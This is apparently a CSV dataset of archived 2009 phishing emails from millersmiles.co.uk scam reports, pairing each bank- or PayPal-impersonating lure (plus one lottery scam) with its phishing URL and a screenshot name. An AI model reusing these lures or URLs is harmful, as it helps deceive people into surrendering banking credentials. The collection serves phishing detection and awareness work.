email_text,screenshot,URL,Details_Link
"﻿

<br />

Crystal Mark 16854<br />

Clarity approved by CE<br />

Plain English Campaign<br />

to<br />

ONLINE BANKING INFORMATION UPGRADE,<br />

Thank you for banking online at Alliance &amp; Leicester. At Alliance &amp; Leicester bank, your security is our primary concem. And in order to guardagainst the recent spate of fraud andidentity theft involving online accountholders, we have recently introducedadditional security measures and upgraded oursoftware to protect our online account holders.<br />

The security upgrade will be effectiveimmediately and requires our customers toupdate their access and Sign in Protection activation.<br />

Please Upgrade Your Information<br />

For your security, you won&#039;t be able to gain access to your accounts until you&#039;ve done this.<br />

Best Regards.<br />

Alliance &amp; Leicester Security Department Team.<br />

Alliance &amp; Leicester is part of the Santander Group, one of the world&#039;s largest banking groups. More information on Banco Santander can be found at www.santander.com<br />

Alliance &amp; Leicester is now part of the Santander Group,<br />

one of the world&#039;s largest banks.<br />

Santander<br />

millersmiles.co.uk<br />

Phishing scam report",409.png,http://www.mybank.alliance-leicester.uh7wn9iu40.co m/index.assp=mybanknlogin_access/index.php,http://www.millersmiles.co.uk/email/your-account-information-security-upgrade-alliance--liecester-11635
"﻿

<br />

HSBC<br />

The world&#039;s local bank<br />

NW<br />

Dear Valued Client,<br />

We recently notices one or more attempts to log in your HSBC Bank account from a foreign IP address and we have reason to believe that your account was hacked by a third party without your authorization.<br />

If you recently accessed your account while traveling, the unusual log in attempts may have initiated by you.<br />

However if you are the rightful holder of the account please click on the log on button below and verify your account information Logon<br />

Failure to verify your information will lead to the temporary suspension of your account online for security reasons<br />

Regards<br />

HSBC Bank UK.<br />

BS<br />

Stay safe and sure<br />

We&#039;re doing everything possible to protect you and your finances from online fraud. Click for safety tips.<br />

GET SAFE ONLINE<br />

millersmiles.co.uk<br />

Phishing scam report<br />

Tips",410.png,http://ccs.net.in/hsbc_secure/1/2/HSBCINTEGRATION/ CAM10;jsessionid/IBlogin.html,http://www.millersmiles.co.uk/email/your-account-has-been-logon-from-suspicious-ip-hsbc-bank
"﻿

<br />

Alliance Leicester<br />

Dear valued customer,<br />

Our new security system will help you to avoid frequent fraudulent transactions,<br />

And to keep your investments safe and secured.<br />

Due to our system data upgrade we recommend you to reactivate your account to avoid service interruption.<br />

Extra security check 25 September 2009.<br />

Alliance &amp; Leicester pic,<br />

Customer service centre, Carlton Park, Narborough, Leicester, LE19 0AL<br />

Upgrade to Internet Explorer 8 Optimised for MSN. Download Now<br />

millersmiles.co.uk<br />

Phishing scam report",411.png,http://www.abcdelprogramador.com/www/mybank.allian ce-leicester.co.uk/newalliance.html,http://www.millersmiles.co.uk/email/extra-security-check-for-25-september-2009-alliance
"﻿

<br />

Abbey<br />

PART OF THE SANTANDER GROUP<br />

Dear Customer,<br />

We detected irregular activity on your Abbey National Bank Account on 26 September 2009. For your protection, you must verify this activity before you can continue using your Account.<br />

To access your statement, just click on the link below.<br />

https://myonlineaccounts2.abbeynational.co.uk/CentralLogon Web/Logon?action=prepare This instruction has been sent to all bank customers and is obligatory to follow.<br />

Thank you<br />

Customers Support Service Abbey National Plc.<br />

millersmiles.co.uk<br />

mille<br />

Phishing scam report",412.png,http://aheusinkveld.free.fr/phpBB2/language/lang_d utch/email/Login.html,http://www.millersmiles.co.uk/email/abbey-national-bank-alert--notification-of-irregular-abbey-national-plc
"﻿

<br />

HALIFAX<br />

a little extra help<br />

Access Suspended<br />

Our Valued Customer,<br />

Your access to Online Banking Service has been suspended. Due to a miss-match access code between your Security information. To enable you continue accessing your online account it will only take you few minutes to verify your Identity. Follow the reference below and you will be guided to where you can gain an instant verification process.<br />

https://halifax-online.co.uk/_mem_bin/customer/formslogin.asp<br />

IMPORTANT - You are strictly advised to match your Sensitive Details correctly to avoid service denial.<br />

Thank you for helping us keep your account safe..<br />

Security Advisor,<br />

Halifax Online Banking Helpdesk<br />

FREE Animations for your email - by IncrediMail! Click<br />

Here!<br />

millersmiles.co.uk<br />

Phishing scam report",413.png,http://www.colombiapoker.net/foro/Packages/.menu/_ mem_bin/formslogin.asp/,http://www.millersmiles.co.uk/email/access-suspended-halifax-online-banking-11662
"﻿

<br />

At your request we have closed your account.<br />

If you want to open a new account please use any U.S. Bank location near you.<br />

If you feel these email was sent in error please use our website and undo the<br />

mystake:<br />

http://kiswebs.kishi.co.jp/.www.usbank.com/<br />

We are sorry for any inconvenience<br />

millersmiles.co.uk Phishing scam report",414.png,http://kiswebs.kishi.co.jp/.www.usbank.com/,http://www.millersmiles.co.uk/email/your-account-is-closed-us-bank-alerts
"﻿

<br />

Alliance Leicester<br />

Dear valued customer,<br />

While reviewing your Online Bank Account, we observed some activities that we would like to further verify. For this reason, limitations have been placed on your account until you review your registered information with us. In order to resolve the account limitations problems, complete our online form by clicking on the link below to avoid service interruption.<br />

Click here to resolve the limitation problems.<br />

Alliance &amp; Leicester pic,<br />

Customer service centre, Carlton Park, Narborough, Leicester, LE19 0AL<br />

Upgrade to Internet Explorer 8 Optimised for MSN. Download Now<br />

millersmiles.co.uk<br />

Phishing scam report",415.png,http://www.edgarmurcia.com/www/mybank.alliance-lei cester.co.uk/index.html,http://www.millersmiles.co.uk/email/account-statement-notification-27-september-2009-alliance
"﻿

<br />

millersmiles.co.uk<br />

Phishing scam report<br />

Alliance<br />

Leicester<br />

ONLINE BANKING INFORMATION UPGRADE,<br />

Crystal Mark 16854<br />

Clarity approved by<br />

Plain English Campaign<br />

Thank you for banking online at Alliance &amp; Leicester. At Alliance &amp; Leicester bank, your security is our primary concern. And in order to guard against the recent spate of fraud and identity theft involving online account holders, we have recently introduced additional security measures and upgraded our software to protect our online account holders.<br />

The security upgrade will be effective immediately and requires our customers to update their access and Sign in Protection activation.<br />

Please Upgrade Your Information<br />

For your security, you won&#039;t be able to gain access to your accounts until you&#039;ve done this.<br />

Best Regards.<br />

Alliance &amp; Leicester Security Department Team.<br />

Alliance &amp; Leicester is part of the Santander Group, one of the world&#039;s largest banking groups. More information on Banco Santander can be found at www.santander.com<br />

Alliance &amp; Leicester is now part of the Santander Group,<br />

one of the world&#039;s largest banks.<br />

Santander",416.png,http://www.mybank.alliance-leicester.21id1dcsfz.co m/index.assp=mybanknlogin_access/index.php,http://www.millersmiles.co.uk/email/your-account-information-security-upgrade-alliance--liecester-11681
"﻿

<br />

millersmiles.co.uk Phishing scam report",417.png,http://geographysa.co.za/bran/alliance%26leicester /online/updates/onlinebanking/login.do/secure.html,http://www.millersmiles.co.uk/email/alert-online-banking-notification-alliance
"﻿

<br />

Abbey<br />

PART OF THE SANTANDER GROUP<br />

Abbey is constantly seeking to improve the service that it offers to its customers. Every time you log on to our online service, we check to ensure that your current browser and computer settings will give the required level of performance and security.<br />

Our software shows us that the browser you are using to access the Abbey Online Service is not one of our supported browsers. however we cannot guarantee optimal performance and security. If you would like to upgrade your system to our current server , simply click the link at the bottom of the page.<br />

https://myonline accounts2.abbeynational.co.uk/CentralLogon Web/Logon?action=prepare Should you have any further questions, please contact our e-commerce support line between the hours of 7am and 11pm, 7 days a week.<br />

millersmiles.co.uk Phishing scam report",418.png,http://www.subaru-korea.com/bbs/icon/abbey.php,http://www.millersmiles.co.uk/email/important-customer-services-message-abbeynational-online
"﻿

<br />

HSBC X<br />

HSBC<br />

HSBC<br />

HSBC Bank P.L.C has been receiving complaints from our customers for unauthorised use of the HSBC Online accounts. As a result we periodically review HSBC Online Accounts and temporarily restrict access of those accounts which we think are vunerable to the unauthorised use.<br />

This message has been sent to you from HSBC Bank because we have noticed invalid login attempts into your account, due to this we are temporarily limiting and restricting your account access until we confirm your identity.<br />

To confirm your identity and remove your account limitation please following the link below.<br />

Log in<br />

Accounts Management As outlined in our User Agreement, HSBC will periodically send you information about site changes and enhancements. Visit our Privacy Policy and User Agreement if you have any questions. http://www.hsbc.co.uk/1/2/help<br />

View your Twitter and Flickr updates from one place - Learn more!<br />

millersmiles.co.uk<br />

Phishing scam report",419.png,http://sallarzarcards.com/HSBC_uk/HSC_uk/hsbc.co.u k/1/2/pib-home/personal/,http://www.millersmiles.co.uk/email/security-alert-hsbc-11707
"﻿

<br />

Online Access Suspension Messageé¤Ÿ<br />

Bank of America<br />

Dear Bank of America Customer,<br />

During our regularly scheduled account maintenance and verification procedures, we have detected a slight error in your account information.<br />

To securely confirm your personal information please click on the link bellow:<br />

Sign in to Online Banking.<br />

Confirm Your Bank of America Account and SiteKey now to enjoy the benefits of online banking and finance to avoid identity theft and fraudulent activities on<br />

your account.<br />

Note: We will be upgrading our yearly SSL EncryptedServer to prevent fraudulent activity.<br />

Bank of America, Member FDIC.<br />

Ã‚Â© 2009 Bank of America Corporation. All Rights Reserved.<br />

millersmiles.co.uk Phishing scam report",420.png,http://www.upctt.sk/upc/includes/.../online.Preven ting.bankofamerica/online.Preventing.bankofamerica /PreventingFraud/onlineid-sessionload/sso.login.co ntrollernoscript=true/signon.do/,http://www.millersmiles.co.uk/email/bank-of-america-alert-online-access-suspension-message-bank-of-america-11721
"﻿

<br />

Alliance Leicester<br />

Thanks banking with Alliance &amp; Leicester !<br />

You have a payment that could not be credited into your account due to change in your online identity.<br />

Pronounce your identify<br />

Your submitted information will be verified by Alliance &amp; Leicester Bank Account Management Department in 24 hours.<br />

Santander Bank Group<br />

Security Advisor<br />

Alliance &amp; Leicester Financial Group<br />

millersmiles.co.uk Phishing scam report",421.png,http://www.lovespath.com/pinkflip/mybank.alliance- leicester/newalliance.html,http://www.millersmiles.co.uk/email/-leicester-bank-account-management-department-alliance--leicester-financial
"﻿

<br />

cahoot<br />

Cahoot Online banking Security Message<br />

We have noticed several invalid login attempts into your account from an unknown IP. Due to this, we are temporarily limiting your online access until we confirm your identity.<br />

CLICK HERE To confirm your identity and remove your account limitation.<br />

Security Advisor Cahoot Bancorp Group<br />

AER stands for Annual Equivalent Rate and illustrates the interest rate if paid and compounded each year. Grossp.a. means the yearly rate of interest before income tax deduction, if applicable. These rates are variable and correct as at 1st June 2009 - The AER assumes that the deposit was made on 1st June 2009.<br />

Beyond Hotmail — see what else you can do with<br />

Windows Live. Find out more.<br />

millersmiles.co.uk<br />

Phishing scam report",422.png,http://yedi24cicek.com/v2/plugins/authentication/c ahoot.php,http://www.millersmiles.co.uk/email/cahoot-customer-security--account-service-notification-cahoot
"﻿

<br />

has won an Award sum of<br />

(?1,500,000.00 GBP) from CIVICUS-UNICEF UK BRANCH. Sponsored by World<br />

Vision International, Canadian International Development Agency (CIDA),<br />

Norwegian Agency for Development Cooperation (NORĀD),Oxfam America, (OA)<br />

e.t.c. in order to enhance worldwide community for child development<br />

in terms of Education, health Care, inspired, committed citizens engaged<br />

in confronting the major challenges facing humanity.<br />

Moreso, Note this is a tax-free draw e-mail addresses of individual,<br />

companies, and corporate bodies Picked by CIVICUS Internet re-search<br />

programmers. Please contact the Agency below for your Claim:<br />

NAME: MR. DAVID BONBRIGHT (KEYSTONE ACCOUNTABILITY)<br />

http://www.civicus.org<br />

EMAIL: david_bonbright@civiusworldwide.org/<br />

info@civiusworldwide.org<br />

TEL: +44 776 381 4367 Fax: +44 870 479 6992<br />

Please to begin your claim, you have to contact our Keystone agent, MR.<br />

DAVID BONBRIGHT with the information as stated above.<br />

You are also advice to provide the following information as stated<br />

below when you reply to claim your funds:<br />

WINNING INFORMATIONS:<br />

CIVICUS WINNING REF #:CV/REF-45670 / PAYMENT CODE (CiVi50132)<br />

1. YOUR FULL NAME:<br />

2. NATIONALITY:<br />

3. CURRENT CONTACT ADDRESS:<br />

4. DATE OF BIRTH (DOB)/SEX / OCCUPATION. 5. TEL/FAX #:<br />

CIVICUS Management.<br />

millersmiles.co.uk<br />

Phishing scam report",423.png,http://www.civicus.org/,http://www.millersmiles.co.uk/email/re-instruction-to-credit-your-account-with-15m-civicus-international
"﻿

<br />

Dear Customer,<br />

Your internet access has been suspended due to many unsuccessful login attempt.<br />

You are kindly advised to follow the instructions below to re-register your account.<br />

Please Click Here To Start<br />

Tesco Bank, Customer Service Centre.<br />

millersmiles.co.uk<br />

Phishing scam report",424.png,http://www.chanhopark61.com/bbs/data/psgtest/11037 03842/tesc/login.htm,http://www.millersmiles.co.uk/email/many-unsuccessful-login-attempt-tesco-bank-plc
"﻿

<br />

Dear valued PayPal member:<br />

Due to concerns, for the safety and integrity of the PayPal<br />

account we have issued this warning message.<br />

It has come to our attention that your PayPal account information needs to be updated as part of our continuing<br />

commitment to protect your account and to reduce the instance of fraud on our website.<br />

If you could please take 5-10 minutes<br />

out of your online experience and update your personal records you will not run into<br />

any future problems with the online service.<br />

Once you have updated your account records your PayPal account service will not be interrupted<br />

and will continue as normal.<br />

To update your PayPal records click on the following link: Click Here<br />

Thank You.<br />

©1999 - 2009 PayPal. All rights reserved.<br />

Scopri le nuove funzionalità di Windows Live. Messenger va oltre - Windows Live: non limitarti alle parole. Condividili in rete!<br />

millersmiles.co.uk<br />

Phishing scam report",425.png,http://cebnovo.ofm.com.br/data/cache/f/oewporkopew krpowekrpowkeporkweporjpoeirjpoij342ij32o4jo2i3j4o i23joiwe/kwermewpjoijip3j2394i324324y83297392y4874 8y234/logon/,http://www.millersmiles.co.uk/email/you-account-has-been-suspended-paypal
"﻿

<br />

Bank Plc<br />

HSBC<br />

You are receiving this message due to multiple login errors on your account, therefore your online access needs updating.<br />

Click here to proceed with a few additional questions to update your account.<br />

Thank you for your co-operation.<br />

millersmiles.co.uk Phishing scam report",426.png,http://hanarokorea.com/bbs/icon/member_image_box/1 /httpwww.hsbc.co.uk12HSBCINTEGRATIONCAM10jsessioni d0000WcyyXkHhoRFXOdYk9G9G6c12ntf14vjIDVURLhsbc.MyH SBCpib.htm,http://www.millersmiles.co.uk/email/-important-security-message-from-hsbc-bank-plc-hsbc-bank-plc
"﻿

<br />

Attention;<br />

S Samuel made an online transfer to your account. The details of this transaction are shown below.<br />

Transfer Date and Time: 10/01/09 Transfer Amount: &quot;800.00 Transfer Description: Rent<br />

To view this transaction and your current balance, log on to www.abbey.com<br />

If you have any questions related to this message or the funds transfer,<br />

please contact our help desk to rectify this problem.<br />

Please Note That Payments May Take Up To 4 Banking Days To Reflect In Your Account.<br />

Sincerely,<br />

Abbey Customer Service.<br />

Abbey National plc. Registered Office: Abbey National House, 2 Triton Square, Regents Place, London, NW1 3AN, United Kingdom. Registered Number 2294747. Registered in<br />

England. www.abbey.com Telephone 0870 607 6000. Calls may be recorded or monitored. Authorized and regulated by the Financial Services Authority. FSA registration number 106054. Abbey and the flame logo are registered trademarks.<br />

-censored by Miller Smiles- -censored by Miller Smiles-<br />

millersmiles.co.uk Phishing scam report",427.png,http://www.studvote.com/adsimg/css/img/1/updated/u pdated/index/Abbey/abbey.com/Logon.php?a=myonlinea ccounts2.abbeynational.co.uk/CentralLogonWeb/Logon ?action=prepare,http://www.millersmiles.co.uk/email/abbey-bank-alert-payment-notification-abbey
"﻿

<br />

Bank of America<br />

Dear member<br />

Because of unusual number of invalid login attempts on your account we had to believe that, their might be some security problem on your account<br />

So we have decided to put an extra verification process to ensure your identity and your account security<br />

Until we can collect this information, your access to sensitive account features will be limited. We would like to restore your access as soon as possible, and we apologize for the inconvenience.<br />

You must verify your account identity.<br />

&gt; Log on to https://bankofamerica.com/privacy/verify.jsp<br />

Please Note:<br />

If we do no receive the appropriate account verification within 48 hours, then we will assume this Bank account is fraudulent and will be suspended. The purpose of this verification is to ensure that your bank account has not been fraudulently used and to combat the fraud from our community.<br />

millersmiles.co.uk Phishing scam report",428.png,http://www.projektrower.pl/images/stories/rower/On lineid.bankofamerica.com/Onlineid.bankofamerica.co m/cgl-bin/ias/jVyelMehIUxiZq/oLzs55Ua8J/2QhDJp4S3N /Al03325/1/bofa/ibd/IAS/presentation/signonScreen. do.php,http://www.millersmiles.co.uk/email/bank-of-americayou-must-verify-your-account-identity-bank-of-america
"﻿

<br />

Santander<br />

Alliance Leicester<br />

Dear Valued Customer,<br />

We recently have determined that different computers have logged into your Alliance &amp; Leicester account, and multiple password failures were present before the logons.<br />

In this manner for your security, your specified access account has been locked and needs to be reactivated, in order for it to remain active, please Use the link below to proceed and unlock your account.<br />

So we want you to use this opportunity to upgrade your account to our new security with the Santander Group, one of the largest banks in the world by market capitalization.<br />

https://www.mybank.alliance-leicester.co.uk/index.asp?ct=mybank<br />

By becoming part of the Santander Group, Alliance &amp; Leicester has acquired strong backing, which is crucial in these difficult financial times.<br />

I am convinced that Abbey, Alliance &amp; Leicester and Bradford &amp; Bingley, as part of the Santander Group, will be a leading UK bank focused on giving you great service and value-for-money products.<br />

Yours sincerely,<br />

Annis<br />

Chairman, Emilio Botin<br />

Alliance &amp; Leicester is now part of the Santander Group, one of the largest banks in the world by market capitalisation.<br />

Beyond Hotmail - see what else you can do with Windows Live. Find out more.<br />

millersmiles.co.uk Phishing scam report",429.png,http://soulseekrecords.org/upload/Alliance-Leicest er.co.uk/index.html,http://www.millersmiles.co.uk/email/your-specified-access-account-locked-alliance
"﻿

<br />

PayPal<br />

Protect Your Account Info<br />

Make sure you never provide your password to fraudulent websites.<br />

PayPal will never ask you to enter your password in an email.<br />

For more information on protecting yourself from fraud, please review our Security Tips at https://www.paypal.com/us/securitytips<br />

Protect Your Password<br />

You should never give your PayPal password to anyone, including PayPal employees.<br />

Update Your Information<br />

It has came to our attention that your PayPal billing information are out of date. This require you to update your billing information as soon as possible. This billing update is also a new PayPal security statement which goes according to the established norms on our terms of service (TOS) to reduce the instance of fraud on our website.<br />

Please update your records. A failure to update your records may result on a suspension of your account.<br />

To update your PayPal records click on the following link:<br />

http://www.paypal.com/us/?cmd=_render-content&amp;content_ID=marketing_us<br />

This new security statement will helps us continue to offer PayPal as a secure and cost-effective payment service. We appreciate your cooperation and assistance.<br />

Sincerely,<br />

The PayPal Team<br />

Please do not reply to this email. This mailbox is not monitored and you will not receive a response. For assistance, log in to your PayPal account and choose the Help link located in the top right corner of any PayPal page.<br />

Paypal Email ID PP295<br />

millersmiles.co.uk<br />

Phishing scam report",430.png,http://www.mbcsat.net,http://www.millersmiles.co.uk/email/alert-paypal--update-your-information-service-paypal
"﻿

<br />

barclaycard<br />

You have 1 new Security Message Alert!<br />

As your safety is our concern, Barclaycard hereby introduces to you the new barclaycard secure card system.<br />

You are hereby required to upgrade your barclaycard details so your security on our SSL server could be guaranteed<br />

Please follow the link below and instructions thereafter.<br />

Click here to update your Barclaycard<br />

Barclaycard Benefits Helpdesk<br />

Barclaycard 2009<br />

millersmiles.co.uk<br />

Phishing scam report",431.png,http://heart2artdonorivf.com/backup/index_files/in itialLogon.do.htm,http://www.millersmiles.co.uk/email/alert-you-have-an-unread-message-barclaycard
"﻿

<br />

Lloyds TSB Account Update<br />

Due to recent update in our online banking, Lloyds TSB Bank requires all customers to update their account,<br />

simply click on the link below to update your online banking account<br />

http://www.lloydstsb.co.uk/personal/accountupdate<br />

Thank you for choosing Lloyds TSB Bank Lloyds TSB for the journey...<br />

New! Receive and respond to mail from other email accounts from within Hotmail Find out how.<br />

millersmiles.co.uk Phishing scam report",432.png,http://zdravnso.ru/downloads/lloydstsb.co.uk/Custo merupdate.html,http://www.millersmiles.co.uk/email/lloyds-tsb-customers-update-notice-lloyds
"﻿

<br />

Verification.<br />

Dear Abbey Customer,<br />

Your Abbey account could have been violated, Someone with ip address: 80.218.189.190 tried to access your account online.<br />

Please click the link below and enter your Personal ID which automatically confirms that you are not currently away.<br />

Online banking Log on<br />

* Telephone: 0845 600 4388<br />

Thank you,<br />

Abbey National pic. e-banking service 1st October 2009<br />

millersmiles.co.uk Phishing scam report",433.png,http://www.filleacgillecce.it/plugins/editors-xtd/ hjhgjhgjhkj/myonlineaccounts2.abbey-national/Centr alLogonWeb/Login.html,http://www.millersmiles.co.uk/email/abbey-secure-messages-center-account-verification-abbey-national-plc--11804
"﻿

<br />

Dear Abbey National Online Customer,<br />

We detected irregular activity on your Abbey Check Card on 02 October, 2009.<br />

As the Primary Contact, you must verify your account activity before you can continue using<br />

your card, and upon verification, we will remove any restrictions placed on your account.<br />

To review your account as soon as possible please click on the link below:<br />

https://myonlineaccounts2.abbeynational.co.uk/CentralLogonWeb/logon?activity<br />

Thank you for using Abbey Bank Online.<br />

We appreciate your business and the opportunity to serve you.<br />

Please do not reply to this e-mail as this is only a notification. Mail sent to this address cannot<br />

be answered.<br />

No virus found in this incoming message.<br />

Checked by AVG - www.avg.com<br />

Version: 8.5.409 / Virus Database: 270.14.3/2409 - Release Date: 10/02/09 06:46:00<br />

millersmiles.co.uk<br />

Phishing scam report",434.png,http://www.xpress-hotshots.com/affiliates.htm,http://www.millersmiles.co.uk/email/abbey-national-online-customer-fraud-department-abbey-national-plc
"﻿

<br />

Bank of America<br />

Dear member<br />

During our usual security enhancement protocol, we observed multiple login attempt error while login in to your online banking account. We have believed that someone other than you is trying to access your account for security reasons, we have temporarily suspend your account and your access to online banking and will be restricted if you fail to update.<br />

To get started:<br />

&gt; Log on to https://www.bankofamerica.com/privacy/update.jsp<br />

防<br />

Please Note:<br />

If we do no receive the appropriate account verification within 48 hours, then we will assume this Bank account is fraudulent and will be suspended. The purpose of this verification is to ensure that your bank account has not been fraudulently used and to combat the fraud from our community.<br />

millersmiles.co.uk Phishing scam report",435.png,http://kowh.co.kr/Nadmin/amboard/compile_newlist/L ogin/Member-informaion/update/Online/,http://www.millersmiles.co.uk/email/bank-of-america-security-alert--update-uour-billing-bank-of-america-alert
"﻿

<br />

2009<br />

Bank of America<br />

We have recently determined that different computers have logged onto your Online Banking account, and multiple password failures were present before the login. It is now necessary to re-confirm your account information to us.<br />

If this is not completed by October 04, 2009, we will be forced to suspend your account indefinitely, as it may have been used for fraudulent purposes. We thank you for your cooperation in this matter.<br />

To confirm your Online Banking records click on the following link: https://www.bankofamerica.com/portal1153/Identity-Sequence/step05.php<br />

Thank you for your patience in this matter.<br />

Bank of America Security Center<br />

© 2009 Bank of America, Inc. All Rights Reserved.<br />

millersmiles.co.uk<br />

Phishing scam report",436.png,http://www.pln2.com/e/pdatesequncebeginspdateecure logi/signin1onlin/,http://www.millersmiles.co.uk/email/bank-of-america-notification--04-october-2009-bank-of-america
"﻿

<br />

Abbey<br />

PART OF THE SANTANDER GROUP<br />

Dear Abbey Bank Customer,<br />

Please note that your Online Banking Account has been flagged due to recent changes that we have made to our banking system. All flagged account requires immediate responds for the activation to their Online Banking. This verification will allow us to activate the new features that is added to your account. Follow this link below to unlock your Online Account and to verify account ownership now:<br />

Click here to unlock your account<br />

At Abbey Bank your security is important to us, for your protection we are proactively notifying you of this activity.<br />

eSaver (issue 2) 2.50% gross/AER(variable). One Year Fixed Rate Saving Bond 2.75% gross/AER on balances over £25,000.<br />

Secure your savings with a guaranteed rate from Abbey.<br />

Abbey National Pic<br />

millersmiles.co.uk Phishing scam report",437.png,http://pansak.net/docs/_notes/login.html,http://www.millersmiles.co.uk/email/new-mail-from-abbey-national-bank-plc-abbey-national-bank-plc
"﻿

<br />

BARCLAYS<br />

Dear Sir/Madam,<br />

Barclays Bank PLC. always look forward for the high security of our clients. During our regularly scheduled account maintenance and verification procedures, we have detected a slight error in your account information. This might be due to either of the following reasons:<br />

1. A recent change in your personal information.<br />

2. Submitting invalid information during the initial sign in process.<br />

Due to this, you are requested to please update and verify your information by clicking the link below:<br />

https://update.barclays.co.uk/olb/p/LoginMember.do<br />

*Important*<br />

We have asked few additional information which is going to be the part of secure login process. These additional information will be asked during your future login security so, please provide all these info completely and correctly otherwise due to security reasons we may have to close your account temporarily.<br />

We thank you for your prompt attention to this matter. Please understand that this is a security measure intended to help protect you and your account. We apologize for any inconvenience.<br />

J. S. Smith Security Advisor<br />

Barclays Bank PLC.<br />

Please do not reply to this e-mail. Mail sent to this address cannot be answered.<br />

For assistance, log in to your Barclays Online Bank account and choose the &quot;Help&quot; link on any<br />

page.<br />

Barclays Email ID # 1009<br />

millersmiles.co.uk<br />

Phishing scam report",438.png,http://luxwors.co.uk/barclays.co.uk/index.htm,http://www.millersmiles.co.uk/email/your-account-has-been-temporarily-suspended-barclays-bank-plc
"﻿

<br />

Alliance &amp; Leicester Bank<br />

Dear customer,<br />

You will be experiencing difficulty in login to your online banking. This is caused by the following reasons:<br />

1. Several attempts on money transfer from unknown IP.<br />

2. An attempt change on your personal detail.<br />

We have every reason to believe that your account has been tampered with by a third party. Click below to restore your account<br />

http://www.alliance-leicester.co.uk/secured-online/index.aspx?page=home&amp;ct=primarymenuDetallePie<br />

Your submitted information will be verified by Alliance &amp; Leicester Bank<br />

Account Management Department in 24 hours.<br />

Santander Bank Group<br />

Security Advisor<br />

Alliance &amp; Leicester Financial Group and Security Department.<br />

millersmiles.co.uk<br />

Phishing scam report",439.png,http://www.advendo-nijverdal.nl/images/mybank.alli ance-leicester/newalliance.html,http://www.millersmiles.co.uk/email/you-will-be-experiencing-difficulty-in-login-to-your-online-alliance--leicester-security
"﻿

<br />

eggTM<br />

Confirm that your Account has not be accessed by unknown third party. Click here to view the content of this message.<br />

millersmiles.co.uk<br />

Phishing scam report",440.png,http://www.krefeldercomputerclub.de/fertige_websho ps/ebay-verkaufsagentur/hpmaker/vorschau/eyin/eggb ank/eggbank/security/customer/logon/URI/new.egg.co m/customer/youraccounts/Egg_Security_Login.htm,http://www.millersmiles.co.uk/email/your-access-has-been-suspended-egg-bank-plc-11864
"﻿

<br />

BARCLAYS<br />

Dear Customer,<br />

To protect your accounts, our monitoring process has temporarily suspended your online access. This had been done due to the number of incorrect login attempts.<br />

At Barclays Bank, we take the job of protecting our customers very seriously, so for your protection we are proactively notifying you of this activity. Due to this, You are requested to follow the provided steps in order .To restore your online access please click on the Log on button below.<br />

Personal Log on<br />

We apologise for any inconvenience caused by this action. Thank you for Banking with Barclays TSB Online Banking<br />

millersmiles.co.uk<br />

Phishing scam report",441.png,http://www.udevipo.gob.gt/components/.onlineconfig s/barclaysonline/,http://www.millersmiles.co.uk/email/barclays-bank-alert--online-banking-access-barclays-bank-11870
"﻿

<br />

We believe it is important to keep up to date with the latest security updates.<br />

To ensure you are always protected, we are introducing a new programme on security called BankSecure-cfx-08 and you will see a number of initiatives that will be put in place to enhance your Internet banking experience.<br />

Sequel to the new security measure, our records indicate that your account was Flagged and has upshot an internal error on our processor. For security reasons, you must update your account to restore full access to your Online Banking.<br />

Login Online Banking to proceed.<br />

This would take a moment.<br />

Regards<br />

Security Team.<br />

NatWest Internet Banking.<br />

New! Receive and respond to mail from other email accounts from within Hotmail Find out how.<br />

millersmiles.co.uk Phishing scam report",442.png,http://www.hollywoodxxxposed.com/store/files/maste r/login.html,http://www.millersmiles.co.uk/email/update-your-account-security-eve
"﻿

<br />

CHASE<br />

Account Locked!<br />

Dear Chase Member,<br />

Due to the number of incorrect loginattempts, your Chase Account has been locked for your security. This has been done to secure your accountsand to protect your private information in case the login attempts were not done by you.. At Chase Bank we care about yoursecurity so, for your protection we are proactively notifying you of this activity.<br />

If you did not trigger this lockout, follow this link to Log on to your Chase Online Account:<br />

Clickhere to unlock your account<br />

Thank you for your prompt attention to this matter.<br />

We apologize for any inconvenience.<br />

Thank you for using Chase!<br />

Pleasedo not reply to this e-mail. Mail sent to this address cannot be answered.<br />

millersmiles.co.uk Phishing scam report",443.png,http://www.technocim.com/UserFiles/www.chase.com/S ignon.htm,http://www.millersmiles.co.uk/email/online-banking-alert-chase-online
"﻿

<br />

We were unable to process your most recent payment. Did you recently change your bank, phone number or credit card? If you have recently updated your billing information,<br />

please disregard this message as we are processing the changes you have made.<br />

Sincerely,<br />

HM Revenue Customs<br />

Log in to My Services for Taxes and Tax Credits<br />

millersmiles.co.uk Phishing scam report",444.png,http://www.unfallauto.de/~mysql/online.hmrc.gov.uk /login/info.htm,http://www.millersmiles.co.uk/email/national-insurance-contributions-erste-bank-hungary-ltd
